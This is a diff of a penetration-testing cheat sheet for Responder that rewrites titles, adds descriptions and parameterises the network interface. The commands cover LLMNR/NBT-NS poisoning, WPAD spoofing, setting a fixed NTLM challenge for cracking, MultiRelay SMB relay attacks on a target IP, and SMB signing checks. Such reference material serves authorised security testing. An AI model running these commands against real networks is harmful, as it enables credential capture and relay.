@@ -2,76 +2,87 @@
 
 % responder, LLMNR, NBT-NS, Poisoning, man in the middle
 
-## responder launch
+## Responder - Launch Basic Listener
+Launches Responder on a specified interface to listen for LLMNR/NBT-NS/mDNS queries.
 #plateform/linux #target/remote #cat/ATTACK/MITM 
 ```
-responder –I eth0
+responder -I <interface>
 ```
 
-## responder launch - analyze mode (no poisoning)
+## Responder - Launch in Analyze Mode (No Poisoning)
+Launches Responder in analyze-only mode, preventing any poisoning.
 #plateform/linux #target/remote #cat/RECON 
 ```
-responder –I eth0 -A
+responder -I <interface> -A
 ```
 
-## responder launch with wpad file 
+## Responder - Launch with WPAD File
+Launches Responder with WPAD proxy enabled.
 #plateform/linux #target/remote #cat/ATTACK/MITM 
 ```
-responder -I eth0 --wpad
+responder -I <interface> --wpad
 ```
 
-## responder http on
+## Responder - Enable HTTP Server
+Enables the HTTP server in Responder's configuration.
 #plateform/linux #target/local #cat/UTILS
 ```
-sed -i 's/HTTP = Off/HTTP = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
+sed -i 's/HTTP = Off/HTTP = On/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'HTTP ='
 ```
 
-## responder http off
+## Responder - Disable HTTP Server
+Disables the HTTP server in Responder's configuration.
 #plateform/linux #target/local #cat/UTILS
 ```
-sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
+sed -i 's/HTTP = On/HTTP = Off/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'HTTP ='
 ```
 
-## responder smb on
+## Responder - Enable SMB Server
+Enables the SMB server in Responder's configuration.
 #plateform/linux #target/local #cat/UTILS
 ```
-sed -i 's/SMB = Off/SMB = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
+sed -i 's/SMB = Off/SMB = On/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'SMB ='
 ```
 
-## responder smb off
+## Responder - Disable SMB Server
+Disables the SMB server in Responder's configuration.
 #plateform/linux #target/local #cat/UTILS
 ```
-sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
+sed -i 's/SMB = On/SMB = Off/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'SMB ='
 ```
 
-## responder challenge set
+## Responder - Set NTLM Challenge
+Sets the NTLM challenge for cracking.
 #plateform/linux #target/local #cat/UTILS
-Set the NTLM challenge for cracking
 
 = challenge: 1122334455667788
 ```
-sed -i 's/Challenge =.*$/Challenge = <challenge>/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'Challenge ='
+sed -i 's/Challenge =.*$/Challenge = <challenge>/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'Challenge ='
 ```
 
-## responder challenge reset
+## Responder - Reset NTLM Challenge
+Resets the NTLM challenge to its default value.
 #plateform/linux #target/local #cat/UTILS
 ```
-sed -i 's/Challenge =.*$/Challenge = 1122334455667788/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'Challenge ='
+sed -i 's/Challenge =.*$/Challenge = 1122334455667788/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'Challenge ='
 ```
 
-## multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf)
+## MultiRelay - Attack with User Filter
+Performs a MultiRelay attack, filtering for specific users (requires HTTP and SMB disabled in Responder.conf).
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
 multirelay -t <ip> -u <user1> <user2>
 ```
 
-## multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)
+## MultiRelay - Attack All Users
+Performs a MultiRelay attack targeting all users (requires HTTP and SMB disabled in Responder.conf).
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
 multirelay -t <ip> -u ALL
 ```
 
-## runfinger - Responder-related utility which will finger a single IP address or an IP subnet and will reveal if a target requires SMB Signing or not.
+## Runfinger - SMB Signing Check
+Responder-related utility which will finger a single IP address or an IP subnet and will reveal if a target requires SMB Signing or not.
 #plateform/linux #target/remote #cat/RECON 
 ```
 runfinger -i <network_range>
